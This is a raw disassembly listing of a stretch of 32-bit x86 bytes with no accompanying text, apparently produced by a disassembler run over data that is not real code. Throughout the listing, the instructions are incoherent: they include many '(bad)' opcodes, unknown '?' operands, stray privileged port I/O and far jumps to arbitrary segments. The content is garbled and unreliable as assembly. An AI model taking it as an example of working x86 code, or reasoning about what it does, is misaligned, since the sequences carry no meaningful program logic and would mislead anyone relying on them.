  4114b6:	fdiv   DWORD PTR [ebx-0x33]
  4114b9:	or     edx,DWORD PTR [ecx+0x59f4468]
  4114bf:	add    eax,0xf66c0390
  4114c4:	add    DWORD PTR [edi+0x5c4b718e],eax
  4114ca:	stos   BYTE PTR es:[edi],al
  4114cb:	cmp    al,0xaf
  4114cd:	mov    bl,0xc4
  4114cf:	pop    ss
  4114d0:	xchg   ecx,eax
  4114d1:	dec    edx
  4114d2:	(bad)  
  4114d3:	rol    DWORD PTR [esi+0x29],cl
  4114d6:	sbb    eax,0xffd4a65a
  4114db:	jg     0x411554
  4114dd:	out    dx,eax
  4114de:	jno    0x411549
  4114e0:	or     DWORD PTR [eax],0x1abc11d9
  4114e6:	xchg   edi,eax
  4114e7:	mov    cl,bl
  4114e9:	push   ds
  4114ea:	push   cs
  4114eb:	ret    
  4114ec:	mov    cl,0x76
  4114ee:	mov    ds:0x834808b3,eax
  4114f3:	add    esp,DWORD PTR [ecx]
  4114f5:	lds    edx,FWORD PTR [eax-0x20c96e3e]
  4114fb:	lea    ecx,[ecx]
  4114fd:	add    ah,0xb4
  411500:	fld    DWORD PTR [edx]
  411502:	test   BYTE PTR [edi],ch
  411504:	repz in al,dx
  411506:	push   ss
  411507:	xor    ebx,edi
  411509:	cwde   
  41150a:	adc    DWORD PTR [esi+eax*8-0x25],0x41
  41150f:	loope  0x411586
  411511:	or     DWORD PTR [edx+0x2fb07118],0xffffff93
  411518:	pop    es
  411519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41151a:	data16 mov WORD PTR ds:0x117734e0,gs
  411521:	mov    ecx,0x8536196d
  411526:	cdq    
  411527:	dec    edi
  411528:	cmp    al,0xfe
  41152a:	mov    eax,0x314ecc3d
  41152f:	mov    ecx,0x77c0c88a
  411534:	jne    0x41150c
  411536:	sar    DWORD PTR [ebp+0x4f],0xab
  41153a:	pop    eax
  41153b:	in     al,0xdd
  41153d:	mov    ds:0x29656b59,eax
  411542:	pop    ss
  411543:	mov    dh,0xb7
  411545:	mov    BYTE PTR [esi-0x5f99f29a],bh
  41154b:	test   BYTE PTR ds:0xa131ca31,0xa2
  411552:	fisubr WORD PTR [eax+eiz*8+0x236bbd90]
  411559:	push   eax
  41155a:	add    edi,esp
  41155c:	lds    esi,FWORD PTR [edi]
  41155e:	and    dl,cl
  411560:	mov    bl,0xb6
  411562:	loopne 0x4115b9
  411564:	loop   0x411589
  411566:	sbb    edi,DWORD PTR [ebp+0x3d]
  411569:	lahf   
  41156a:	mov    dl,0x60
  41156c:	mov    edx,0x3e4d7b1d
  411571:	sbb    dh,BYTE PTR [ecx+0x6e]
  411574:	mov    dh,0xff
  411576:	imul   esp,DWORD PTR [ebx],0xb647fd7b
  41157c:	mov    dh,bh
  41157e:	jle    0x4115d0
  411580:	cmp    al,0x3d
  411582:	cmp    DWORD PTR [edx+0x2da5ffcd],esp
  411588:	in     al,0xb1
  41158a:	adc    dl,bl
  41158c:	cmp    DWORD PTR [ebx+0x7c],0xaad140d1
  411593:	pop    eax
  411594:	ins    BYTE PTR es:[edi],dx
  411595:	(bad)  
  411596:	in     eax,0x95
  411598:	out    0x9e,eax
  41159a:	fwait
  41159b:	or     dh,BYTE PTR [edi]
  41159d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41159e:	mov    DWORD PTR [edx],0xdf1439cf
  4115a4:	rcr    BYTE PTR ds:0x1107c45e,cl
  4115aa:	(bad)  
  4115ab:	xor    ch,BYTE PTR [ebx-0x1bbb5f75]
  4115b1:	sbb    eax,0x8bf487a
  4115b6:	inc    ebx
  4115b7:	mov    ch,0x8a
  4115b9:	xchg   ecx,eax
  4115ba:	into   
  4115bb:	mov    ds:0x8c50e21c,al
  4115c0:	(bad)  
  4115c1:	int3   
  4115c2:	mov    esi,DWORD PTR [ebx-0x63b98ba4]
  4115c8:	dec    ebp
  4115c9:	or     al,0x7e
  4115cb:	xchg   ebp,eax
  4115cc:	clc    
  4115cd:	dec    ebx
  4115ce:	xor    BYTE PTR [edi+edx*4+0x3bc49e84],ch
  4115d5:	pop    ebp
  4115d6:	mov    dl,0x3c
  4115d8:	shl    BYTE PTR [ebx-0x55891197],cl
  4115de:	and    BYTE PTR [ebx+0x78],ch
  4115e1:	or     BYTE PTR [esi-0x6a],0xf8
  4115e5:	test   eax,0xb7a313b6
  4115ea:	mov    esi,0xbdf3d9fb
  4115ef:	pop    ebp
  4115f1:	or     bh,BYTE PTR [edi+0x247cc17a]
  4115f7:	jnp    0x411634
  4115f9:	xlat   BYTE PTR ds:[ebx]
  4115fa:	pop    ds
  4115fb:	pusha  
  4115fc:	xchg   ebp,eax
  4115fd:	pusha  
  4115fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ff:	mov    ebp,0x8969e013
  411604:	(bad)  
  411606:	popf   
  411607:	mov    ds:0x459e607a,al
  41160c:	mov    edi,0x6a2f69ba
  411611:	mov    edx,0x2a304a8b
  411616:	mov    WORD PTR [ebp-0x5ceb49d4],gs
  41161c:	push   edx
  41161d:	pop    edi
  41161e:	push   edi
  41161f:	mov    edi,0xf6ec3ccd
  411624:	push   es
  411625:	inc    ecx
  411626:	in     eax,dx
  411627:	mov    ds,WORD PTR [ebp-0x669d335e]
  41162d:	nop
  41162e:	ins    DWORD PTR es:[edi],dx
  41162f:	std    
  411630:	xchg   edx,eax
  411631:	std    
  411632:	call   FWORD PTR [ebp+edx*4-0x2edc1885]
  411639:	sub    cl,BYTE PTR [ebx-0x28bdeabc]
  41163f:	sub    eax,0xa7413e12
  411644:	call   0x6fc0bd8f
  411649:	xor    ah,BYTE PTR [ebx]
  41164b:	xor    BYTE PTR [ecx+0x6b347cb0],ah
  411651:	dec    edi
  411652:	shr    bl,cl
  411654:	mov    ebx,0xdd1436d0
  411659:	mov    eax,DWORD PTR [ebp+0x5b6955d]
  41165f:	das    
  411660:	dec    edx
  411661:	imul   eax,DWORD PTR [esi],0x7e
  411664:	pop    esi
  411665:	pop    ss
  411666:	push   esp
  411667:	call   FWORD PTR [eax+edi*1-0x2d96f545]
  41166e:	aaa    
  41166f:	out    dx,al
  411670:	outs   dx,BYTE PTR ds:[esi]
  411671:	sbb    al,0xd9
  411673:	or     DWORD PTR [edi-0x16],esp
  411676:	jl     0x411648
  411678:	add    BYTE PTR [edi-0x74],dl
  41167b:	xchg   DWORD PTR [ebx+0x327ee31a],ebx
  411681:	sbb    esi,edx
  411683:	and    esi,edi
  411685:	in     al,0x53
  411687:	mov    esi,0xfab01bbd
  41168c:	and    BYTE PTR [eax-0x6e6762a4],bh
  411692:	and    DWORD PTR [ebp+edi*8+0x36],ebx
  411696:	xchg   esi,eax
  411697:	aad    0xe9
  411699:	call   0xe3857529
  41169e:	into   
  41169f:	inc    ebp
  4116a0:	add    al,0xa0
  4116a2:	jnp    0x411634
  4116a4:	mov    edx,0x15df6e79
  4116a9:	mov    bl,0xc3
  4116ab:	inc    edi
  4116ac:	shl    BYTE PTR [esi],cl
  4116ae:	push   ds
  4116af:	je     0x411671
  4116b1:	sub    DWORD PTR [ebp+0x7f2fed4d],edi
  4116b7:	add    ah,BYTE PTR [esi-0x19]
  4116ba:	cmp    ah,ah
  4116bc:	xchg   ecx,eax
  4116bd:	mul    ecx
  4116bf:	push   0xffffffeb
  4116c1:	inc    edi
  4116c2:	imul   edi,DWORD PTR [eax-0x1e],0xf539f701
  4116c9:	sub    BYTE PTR [edi-0x1f],0xb3
  4116cd:	dec    edx
  4116ce:	jp     0x411656
  4116d0:	call   0x6635:0xecd9c1b
  4116d7:	ins    DWORD PTR es:[edi],dx
  4116d8:	adc    eax,0x73e1b6ec
  4116dd:	popf   
  4116de:	aaa    
  4116df:	loope  0x4116fc
  4116e1:	mov    ebp,0x6a221a8e
  4116e6:	jmp    0x61d5:0x827a922b
  4116ed:	lock rcr BYTE PTR [eax],cl
  4116f0:	aas    
  4116f1:	sub    esp,DWORD PTR es:[esi-0x41]
  4116f5:	jo     0x41171b
  4116f7:	sbb    dl,dl
  4116f9:	stos   BYTE PTR es:[edi],al
  4116fa:	jg     0x4116a2
  4116fc:	push   ebx
  4116fd:	mov    dl,0xa3
  4116ff:	or     eax,0xee3eae92
  411704:	mov    esi,0xb0bf6cd9
  411709:	stos   DWORD PTR es:[edi],eax
  41170a:	test   DWORD PTR [esp+edi*4+0x3df4cb76],ecx
  411711:	ficom  DWORD PTR [edx+0x1a134517]
  411717:	mov    al,ds:0xad030c56
  41171c:	mov    esp,0xae3c7137
  411721:	jle    0x41177c
  411723:	mov    bh,0xa7
  411725:	pop    edi
  411726:	and    al,0xc9
  411728:	in     eax,0x14
  41172a:	mov    ecx,esp
  41172c:	lds    edi,FWORD PTR [edi]
  41172e:	mov    ds:0xfb6c7c79,eax
  411733:	jmp    0x4e21:0x143d0b96
  41173a:	inc    edx
  41173b:	fmul   st,st(5)
  41173d:	ret    
  41173e:	push   ss
  41173f:	cmp    DWORD PTR [ecx-0x170acc11],esi
  411745:	mov    eax,ds:0x722116b2
  41174a:	or     cl,bl
  41174c:	stos   DWORD PTR es:[edi],eax
  41174d:	fcom   DWORD PTR [edx]
  41174f:	enter  0x8e50,0x12
  411753:	or     BYTE PTR [edx-0x35],bl
  411756:	pop    edi
  411757:	dec    eax
  411758:	ficomp DWORD PTR [edi+0x3fd71822]
  41175e:	sti    
  41175f:	lods   eax,DWORD PTR ds:[esi]
  411760:	fadd   QWORD PTR [ecx+0xd]
  411763:	cmp    al,0xea
  411765:	pop    ecx
  411766:	fistp  QWORD PTR [eax+0x34435046]
  41176c:	inc    ebx
  41176d:	aas    
  41176e:	mov    ecx,ebp
  411770:	fidivr WORD PTR [edx-0x74]
  411773:	and    ah,ch
  411775:	popa   
  411776:	out    0xae,al
  411778:	fild   QWORD PTR ds:0x1974ff23
  41177e:	shl    DWORD PTR [edi+0x6e],0xb7
  411782:	jle    0x41177d
  411784:	iret   
  411785:	(bad)  
  411787:	push   eax
  411788:	call   0x1321d59e
  41178d:	fsub   QWORD PTR [eax]
  41178f:	push   ebp
  411790:	push   ds
  411791:	test   ah,al
  411793:	lods   al,BYTE PTR ds:[esi]
  411794:	dec    ebx
  411795:	pop    ds
  411796:	in     eax,0x3b
  411798:	pop    ds
  411799:	dec    edi
  41179a:	xor    al,0xe5
  41179c:	mov    cl,0xa1
  41179e:	jecxz  0x41176a
  4117a0:	mov    dh,0x4c
  4117a2:	add    ebx,esi
  4117a4:	dec    esp
  4117a5:	dec    ecx
  4117a6:	sub    dl,BYTE PTR [esi]
  4117a8:	lods   al,BYTE PTR ds:[esi]
  4117a9:	shl    DWORD PTR [edi-0x1e],0x92
  4117ad:	les    eax,FWORD PTR [edx]
  4117af:	add    eax,0x6c1c8d4e
  4117b4:	mov    ebp,0x7b7b13c5
  4117b9:	cmp    eax,0xea54a6cf
  4117be:	int3   
  4117bf:	jecxz  0x4117ad
  4117c1:	mov    ebx,DWORD PTR [edx]
  4117c3:	(bad)  
  4117c4:	pop    ds
  4117c5:	dec    ebx
  4117c6:	icebp  
  4117c7:	bound  ecx,QWORD PTR [esi-0x443ee89f]
  4117cd:	jno    0x41180a
  4117cf:	popa   
  4117d0:	cmp    al,0x61
  4117d2:	ja     0x41180d
  4117d4:	retf   
  4117d5:	std    
  4117d6:	retf   0x4ef5
  4117d9:	rcr    DWORD PTR [ebx-0x68],cl
  4117dc:	adc    al,cl
  4117de:	add    DWORD PTR [edi+0x444c966a],eax
  4117e4:	pop    ds
  4117e5:	jmp    0x1b7b4b99
  4117ea:	mov    WORD PTR [ebp+0x57],gs
  4117ed:	xchg   edx,eax
  4117ee:	jg     0x41178e
  4117f0:	es fmul st(3),st
  4117f3:	dec    esi
  4117f4:	and    ebp,edi
  4117f6:	jbe    0x4117a6
  4117f8:	pop    eax
  4117f9:	jg     0x411877
  4117fb:	sub    bh,BYTE PTR [esi-0x6ec1d3ac]
  411801:	push   0x23
  411803:	adc    eax,0xba2cd752
  411808:	dec    esp
  411809:	loopne 0x4117e9
  41180b:	inc    eax
  41180c:	sbb    al,bl
  41180e:	and    edx,ecx
  411810:	dec    esi
  411811:	xor    al,BYTE PTR [edi+0x59eaab60]
  411817:	sbb    al,0x41
  411819:	imul   esp,DWORD PTR [edx],0x74235a57
  41181f:	xchg   edi,eax
  411820:	mov    edi,DWORD PTR [eax-0x53]
  411823:	fsubr  st(1),st
  411825:	adc    ebx,DWORD PTR [ebx+0x64]
  411828:	popa   
  411829:	xchg   DWORD PTR [esi],eax
  41182b:	pop    ds
  41182c:	ins    BYTE PTR es:[edi],dx
  41182d:	jle    0x41187f
  41182f:	jp     0x4118a9
  411831:	(bad)  
  411833:	inc    eax
  411834:	ficomp WORD PTR [edx]
  411836:	push   esi
  411837:	repz dec ebx
  411839:	jecxz  0x411801
  41183b:	sbb    DWORD PTR ds:0x22ba1c1a,ebx
  411841:	je     0x411820
  411843:	jmp    0x6a2ced96
  411848:	push   DWORD PTR ds:0x60f2cd26
  41184e:	sti    
  41184f:	aaa    
  411850:	xor    DWORD PTR [esp+esi*1-0x73],esp
  411854:	scas   al,BYTE PTR es:[edi]
  411855:	stc    
  411856:	jl     0x411891
  411858:	push   esi
  411859:	out    dx,al
  41185a:	lods   al,BYTE PTR ds:[esi]
  41185b:	jge    0x12a0fd86
  411861:	lahf   
  411862:	jne    0x4118bc
  411864:	xchg   DWORD PTR [ebp+0x4b],edx
  411867:	adc    bl,BYTE PTR [edx]
  411869:	dec    ebp
  41186a:	lods   eax,DWORD PTR ds:[esi]
  41186b:	pop    ss
  41186c:	push   ecx
  41186d:	xchg   edx,eax
  41186e:	fcomp  QWORD PTR [edx+0x33]
  411871:	adc    edi,DWORD PTR [ebp-0x2c]
  411874:	data16 (bad) 
  411876:	pop    ecx
  411877:	push   edi
  411878:	iret   
  411879:	or     al,0x20
  41187b:	scas   al,BYTE PTR es:[edi]
  41187c:	or     ch,BYTE PTR [ebp-0x6826eaa0]
  411882:	sub    BYTE PTR [ebx],cl
  411884:	and    ebx,DWORD PTR [ebp-0x4d5907c0]
  41188a:	popf   
  41188b:	popf   
  41188c:	mov    ah,0x84
  41188e:	cmp    bh,bl
  411890:	cwde   
  411891:	mov    edi,0xe4aa84f8
  411896:	sub    ebp,edi
  411898:	jecxz  0x41189e
  41189a:	je     0x4118f0
  41189c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41189d:	dec    esi
  41189e:	mov    bl,0x35
  4118a0:	xor    eax,0x42528e40
  4118a5:	test   DWORD PTR [esi+0x51],eax
  4118a8:	aaa    
  4118a9:	(bad)  
  4118ab:	jp     0x411877
  4118ad:	jno    0x411886
  4118af:	cmp    BYTE PTR [eax],0xed
  4118b2:	xchg   esp,eax
  4118b3:	pop    edi
  4118b4:	sub    BYTE PTR [esp+edx*2],dh
  4118b7:	test   BYTE PTR [ebx],dl
  4118b9:	xchg   cl,bh
  4118bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bc:	adc    eax,0x54c6a95e
  4118c1:	int3   
  4118c2:	icebp  
  4118c3:	push   0x7c043b36
  4118c8:	dec    edi
  4118c9:	adc    eax,0xf805992a
  4118ce:	(bad)  
  4118cf:	xor    edi,ebx
  4118d1:	imul   edx,DWORD PTR [edx+0x3211b173],0xffffffd0
  4118d8:	aad    0x12
  4118da:	sub    BYTE PTR [edx-0x64],al
  4118dd:	(bad)  
  4118de:	dec    esp
  4118df:	fs push es
  4118e1:	int    0x4c
  4118e3:	sub    eax,0xf9f4a005
  4118e8:	mov    eax,DWORD PTR [esi+0x62e8b65e]
  4118ee:	jnp    0x41188a
  4118f0:	inc    esi
  4118f1:	mov    ah,0xd7
  4118f3:	sahf   
  4118f4:	inc    ebx
  4118f5:	and    al,0x1a
  4118f7:	into   
  4118f8:	inc    esi
  4118f9:	dec    esp
  4118fa:	jmp    FWORD PTR [ecx]
  4118fc:	pop    ebx
  4118fd:	test   eax,0x4c5b362c
  411902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411903:	out    dx,eax
  411904:	dec    edx
  411905:	fadd   QWORD PTR [edi+0x43]
  411908:	jns    0x411909
  41190a:	dec    ebp
  41190b:	stc    
  41190c:	and    eax,DWORD PTR [ebx+ebp*8]
  41190f:	jmp    0x71d4e110
  411914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411915:	bound  edi,QWORD PTR [eax]
  411917:	mov    BYTE PTR [ebx-0x30],bl
  41191a:	rol    eax,0xe3
  41191d:	(bad)  
  41191f:	cmp    DWORD PTR [esp+ecx*2],ebx
  411922:	sbb    al,0x49
  411924:	add    BYTE PTR [esi],bl
  411926:	data16 (bad) 
  411928:	je     0x41192f
  41192a:	or     BYTE PTR [edx+0x2],0x60
  41192e:	ja     0x4118fc
  411930:	daa    
  411931:	pop    esi
  411932:	ins    BYTE PTR es:[edi],dx
  411933:	hlt    
  411934:	xor    DWORD PTR [ecx-0x6],esi
  411937:	pop    edx
  411938:	popf   
  411939:	adc    ah,BYTE PTR [edi+0x1]
  41193c:	jmp    0x6e0e:0x3833f657
  411943:	pop    es
  411944:	loopne 0x411982
  411946:	fsubr  st(2),st
  411948:	cdq    
  411949:	std    
  41194a:	(bad)  
  41194b:	out    dx,al
  41194c:	(bad)  
  41194d:	mov    edi,0x502962e
  411952:	xchg   esp,eax
  411953:	fisttp QWORD PTR [ebx]
  411955:	test   BYTE PTR [edx+0x47],bl
  411958:	push   ebx
  411959:	xchg   BYTE PTR [edi],dh
  41195b:	mov    ch,0x3c
  41195d:	mov    cl,0x5e
  41195f:	jl     0x411916
  411961:	cld    
  411962:	mov    edx,0xf2313426
  411967:	add    al,0x14
  411969:	daa    
  41196a:	in     eax,0x38
  41196c:	cmp    eax,DWORD PTR ds:0xb339e6ab
  411972:	stos   DWORD PTR es:[edi],eax
  411973:	mov    BYTE PTR [ebp+0x4d],bh
  411976:	and    eax,esp
  411978:	sub    al,0x9d
  41197a:	and    eax,0x26d6bacd
  41197f:	pop    ecx
  411980:	mov    edi,DWORD PTR [edx+0xe8f7595]
  411986:	push   esi
  411987:	or     BYTE PTR [esi+0x5b],cl
  41198a:	gs or  edi,ebx
  41198d:	mov    ch,0xd2
  41198f:	or     al,0xa8
  411991:	pop    eax
  411992:	(bad)  [eax-0x71]
  411995:	sti    
  411996:	sbb    eax,0xe1ec95ac
  41199b:	daa    
  41199c:	jne    0x411994
  41199e:	cs dec esp
  4119a0:	jl     0x4119a8
  4119a2:	jne    0x411998
  4119a4:	out    0x6d,al
  4119a6:	test   dh,dh
  4119a8:	jb     0x4119a9
  4119aa:	push   edi
  4119ab:	mov    ch,0xe2
  4119ad:	cli    
  4119ae:	retf   0x96f6
  4119b1:	ins    BYTE PTR es:[edi],dx
  4119b2:	sbb    al,0x14
  4119b4:	retf   
  4119b5:	out    0x69,al
  4119b7:	sbb    bl,BYTE PTR [esi-0x6a]
  4119ba:	mov    ch,0xb7
  4119bd:	jl     0x4119a0
  4119bf:	(bad)  
  4119c0:	and    DWORD PTR [edi+0xa8d75b8],ebp
  4119c6:	push   ebx
  4119c7:	dec    eax
  4119c8:	loop   0x411980
  4119ca:	idiv   BYTE PTR [esi-0x21]
  4119cd:	inc    esp
  4119ce:	sbb    dh,BYTE PTR [eax]
  4119d0:	xor    esi,edx
  4119d2:	push   esp
  4119d3:	ret    
  4119d4:	ins    DWORD PTR es:[edi],dx
  4119d5:	div    BYTE PTR [ecx+0x6bcc9c95]
  4119db:	lahf   
  4119dc:	mov    al,0xfd
  4119de:	test   al,0x78
  4119e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e1:	mov    esi,0x36714702
  4119e6:	aas    
  4119e7:	fwait
  4119e8:	xor    edx,DWORD PTR [esp+ebx*2-0x25]
  4119ec:	(bad)  
  4119ed:	pop    esi
  4119ee:	stc    
  4119ef:	lods   eax,DWORD PTR ds:[esi]
  4119f0:	dec    ebx
  4119f1:	mov    dh,0xf2
  4119f3:	cwde   
  4119f4:	mov    ebx,0x8ef6999d
  4119f9:	push   ecx
  4119fa:	jmp    0x2add:0x82abc22d
  411a01:	or     DWORD PTR [edi+edi*1],edi
  411a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a05:	lods   eax,DWORD PTR ds:[esi]
  411a06:	fst    st(1)
  411a08:	imul   ecx,DWORD PTR [ebx],0x5a
  411a0b:	adc    eax,0x3f781ddf
  411a10:	jno    0x411a72
  411a12:	push   ds
  411a13:	mov    ?,WORD PTR [ebx-0x79]
  411a16:	mov    ds:0x83da9237,al
  411a1b:	leave  
  411a1c:	mov    al,ds:0xacee81a0
  411a21:	fdiv   DWORD PTR [edx-0x6a44ba25]
  411a27:	xor    al,BYTE PTR [ebp-0x5cd2e6b7]
  411a2d:	adc    esp,esi
  411a2f:	dec    eax
  411a30:	or     DWORD PTR [edx+edx*8+0x1],edx
  411a34:	add    eax,0x2a1e1d6b
  411a39:	ucomiss xmm6,DWORD PTR [ecx+0x40]
  411a3d:	cmp    BYTE PTR [ecx],ch
  411a3f:	retf   0xf967
  411a42:	sub    BYTE PTR [ebx+esi*8-0x4d8b8cf5],dl
  411a49:	sub    al,0x66
  411a4b:	rol    DWORD PTR [ebp+0x65],0xa7
  411a4f:	neg    BYTE PTR [esi+0x5ec36840]
  411a55:	inc    edx
  411a56:	or     esi,DWORD PTR [edi-0x5c]
  411a59:	movlps xmm4,QWORD PTR [edi-0x21]
  411a5d:	mov    bh,0x26
  411a5f:	sub    DWORD PTR [ebp-0x69624afd],ecx
  411a65:	mov    edx,0x1f344fc
  411a6a:	addr16 xchg ecx,eax
  411a6c:	inc    DWORD PTR [esi]
  411a6e:	ror    bl,cl
  411a70:	mov    edi,cs
  411a72:	jmp    0x411a19
  411a74:	sub    dh,dh
  411a76:	inc    esi
  411a77:	or     bh,0x46
  411a7a:	cmc    
  411a7b:	mov    ecx,0xb57c8360
  411a80:	fs int 0x45
  411a83:	repnz jecxz 0x411a38
  411a86:	shl    WORD PTR [eax+0x11],1
  411a8a:	retf   
  411a8b:	inc    eax
  411a8c:	pushf  
  411a8d:	xor    al,0x46
  411a8f:	in     eax,0x3b
  411a91:	jno    0x411aaa
  411a93:	jne    0x411a28
  411a95:	jle    0x411aa0
  411a97:	mov    ah,0x36
  411a99:	push   esi
  411a9a:	shl    BYTE PTR [edi+0x9],1
  411a9d:	add    edx,DWORD PTR [eax]
  411a9f:	ret    
  411aa0:	xor    al,0xdc
  411aa2:	adc    DWORD PTR [esp+ebp*1],ebx
  411aa5:	lods   al,BYTE PTR ds:[esi]
  411aa6:	ret    
  411aa7:	jge    0x411ab2
  411aa9:	mov    ds,WORD PTR [ecx+0x40]
  411aac:	or     ch,BYTE PTR [ecx-0x7c]
  411aaf:	(bad)  [edi]
  411ab1:	dec    esp
  411ab2:	jle    0x411a66
  411ab4:	mov    ds:0xc3d7b502,eax
  411ab9:	dec    edi
  411aba:	xor    BYTE PTR [ebx+eax*2],cl
  411abd:	xchg   ebp,eax
  411abe:	dec    edi
  411abf:	dec    edi
  411ac0:	inc    ebp
  411ac1:	cmp    DWORD PTR [edx+0x22],esi
  411ac4:	push   ecx
  411ac5:	test   dl,bh
  411ac7:	lea    esi,es:[eax+0x20b2d2d9]
  411ace:	iret   
  411acf:	sahf   
  411ad0:	cmc    
  411ad1:	push   edi
  411ad2:	fistp  WORD PTR [edi]
  411ad4:	jbe    0x411a60
  411ad6:	and    eax,0x837898ed
  411adb:	push   ecx
  411adc:	adc    al,0x30
  411ade:	cld    
  411adf:	and    DWORD PTR ds:0xd6ff2b9a,0xffffff99
  411ae6:	push   cs
  411ae7:	imul   esi,DWORD PTR [ebx+0x2d],0x21
  411aeb:	jno    0x411a83
  411aed:	(bad)  
  411aef:	(bad)  
  411af0:	lods   al,BYTE PTR ds:[esi]
  411af1:	enter  0x7664,0xbe
  411af5:	rol    DWORD PTR [ebx+0x2f],0xad
  411af9:	and    ah,BYTE PTR [ebx]
  411afb:	pop    ecx
  411afc:	rcr    ah,1
  411afe:	cld    
  411aff:	sub    eax,ecx
  411b01:	cld    
  411b02:	aam    0xdc
  411b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b05:	jmp    0x640d:0x83e92cc6
  411b0c:	fistp  QWORD PTR [ecx-0x75bc2157]
  411b12:	mov    cl,0xbc
  411b14:	mov    ds:0x47a49963,eax
  411b19:	mov    WORD PTR [eax-0x6b9c428b],es
  411b1f:	das    
  411b20:	dec    edi
  411b21:	pop    ebp
  411b22:	imul   BYTE PTR [ebx+0x9eb498]
  411b28:	daa    
  411b29:	std    
  411b2a:	psubw  mm5,QWORD PTR [ebx+0xe]
  411b2e:	enter  0x373d,0x38
  411b32:	push   0xffffffd9
  411b34:	mov    bh,0x7
  411b36:	pop    eax
  411b37:	mov    esi,0xe34ffc07
  411b3d:	lock mov bh,ch
  411b40:	adc    esp,DWORD PTR ds:0x187f2136
  411b46:	loop   0x411b4e
  411b48:	jg     0x411b9e
  411b4a:	mov    eax,0x885e6b16
  411b4f:	adc    DWORD PTR [esi-0x5f414eab],edi
  411b55:	scas   eax,DWORD PTR es:[edi]
  411b56:	stos   DWORD PTR es:[edi],eax
  411b57:	cwde   
  411b58:	mov    bh,BYTE PTR [edx-0x64addcef]
  411b5e:	ret    
  411b5f:	mov    WORD PTR [esi+0x77],?
  411b62:	ins    DWORD PTR es:[edi],dx
  411b63:	dec    esi
  411b64:	retf   
  411b65:	fnstcw WORD PTR [ebp+0x10354f14]
  411b6b:	ja     0x411ba7
  411b6d:	ret    
  411b6e:	loop   0x411bca
  411b70:	inc    esi
  411b71:	ins    BYTE PTR es:[edi],dx
  411b72:	mov    bh,0x89
  411b74:	sbb    edx,DWORD PTR [eax+0x40019dc6]
  411b7a:	shr    BYTE PTR [esi-0x6352c09],1
  411b80:	sbb    al,0x3e
  411b82:	fwait
  411b83:	jle    0x411b5b
  411b85:	(bad)  
  411b87:	out    0xd7,al
  411b89:	(bad)  
  411b8a:	fcom   DWORD PTR es:[esi-0x2eaa8e73]
  411b91:	dec    edi
  411b92:	mov    edi,0x708b1ba2
  411b97:	pop    esp
  411b98:	cdq    
  411b99:	mov    al,0x88
  411b9b:	aad    0xf4
  411b9d:	fs mov ch,0xdf
  411ba0:	int    0xbf
  411ba2:	(bad)
  411ba5:	loopne 0x411bee
  411ba7:	jns    0x411b89
  411ba9:	mov    ds:0xc3551d84,eax
  411bae:	vpsubsb xmm7,xmm3,XMMWORD PTR [eax+0x44ebf46d]
  411bb6:	in     al,0x74
  411bb8:	sbb    dh,BYTE PTR [ebx+eiz*2-0x3f620794]
  411bbf:	pop    esp
  411bc0:	and    BYTE PTR [ebp-0x7b867b2b],0xad
  411bc7:	pop    edi
  411bc8:	imul   ecx,ebp,0x24202b43
  411bce:	(bad)  
  411bcf:	loopne 0x411bb8
  411bd1:	cld    
  411bd2:	sti    
  411bd3:	sbb    DWORD PTR [esi],edx
  411bd5:	xchg   ebp,eax
  411bd6:	mov    dl,0xd8
  411bd8:	int    0x14
  411bda:	addr16 fwait
  411bdc:	sbb    dh,ch
  411bde:	sbb    BYTE PTR [edx+0x42],ch
  411be1:	into   
  411be2:	retf   
  411be3:	pop    esi
  411be4:	xor    eax,0x4fb16196
  411be9:	gs cmp al,0xd9
  411bec:	mov    cl,0x1a
  411bee:	fsubp  st(6),st
  411bf0:	in     al,dx
  411bf1:	fadd   st(3),st
  411bf3:	xchg   esi,eax
  411bf4:	jmp    0xd650:0x6420fd16
  411bfb:	mov    bh,0x53
  411bfd:	cmp    bh,BYTE PTR [edx+edx*2+0x45]
  411c01:	ss ret 
  411c03:	xor    DWORD PTR [ecx-0xb25a95a],esp
  411c09:	hlt    
  411c0a:	cli    
  411c0b:	popa   
  411c0c:	in     al,0xb5
  411c0e:	std    
  411c0f:	sub    al,BYTE PTR [edi+0x45a1f94a]
  411c15:	push   esp
  411c16:	push   ebp
  411c17:	mov    ds:0xb9a6ed76,eax
  411c1c:	or     BYTE PTR [ebp+0x6cc3bcd3],ch
  411c22:	sub    bl,cl
  411c24:	ror    eax,1
  411c26:	mov    dh,0xe5
  411c28:	push   ecx
  411c29:	cli    
  411c2a:	shr    BYTE PTR ds:0x955b1c45,0xb8
  411c31:	out    dx,eax
  411c32:	lods   al,BYTE PTR ds:[esi]
  411c33:	fsub   st(7),st
  411c35:	jb     0x411c95
  411c37:	(bad)  [eax]
  411c39:	shl    ah,cl
  411c3b:	pop    eax
  411c3c:	push   bx
  411c3e:	call   0xe1547b37
  411c43:	dec    ebp
  411c44:	sub    DWORD PTR [esi],ebx
  411c46:	inc    ebx
  411c47:	adc    DWORD PTR [ecx],ecx
  411c49:	pusha  
  411c4a:	imul   ebx,DWORD PTR [eax+eiz*8-0x1b2f1ded],0xb47eb470
  411c55:	inc    edi
  411c56:	add    ebp,0xd2fcdd89
  411c5c:	call   0xf71428df
  411c61:	push   edx
  411c62:	sub    dh,bh
  411c64:	mov    ah,0xf5
  411c66:	shl    BYTE PTR [edx-0x3c],cl
  411c69:	fild   QWORD PTR [edx+eiz*2]
  411c6c:	pusha  
  411c6d:	bound  eax,QWORD PTR [ecx+0x19]
  411c70:	sbb    al,ah
  411c72:	rol    bh,cl
  411c74:	mov    ebp,0xef3d12b6
  411c79:	dec    ebx
  411c7a:	jne    0x411cf1
  411c7c:	rcl    BYTE PTR [esi+esi*1-0x3b3accd8],cl
  411c83:	inc    eax
  411c84:	out    dx,al
  411c85:	cmp    esi,DWORD PTR [esi+0x5ce54b4e]
  411c8b:	repz shl DWORD PTR [edi],0xbd
  411c8f:	push   esi
  411c90:	jp     0x411cf1
  411c92:	inc    ebx
  411c93:	inc    ebp
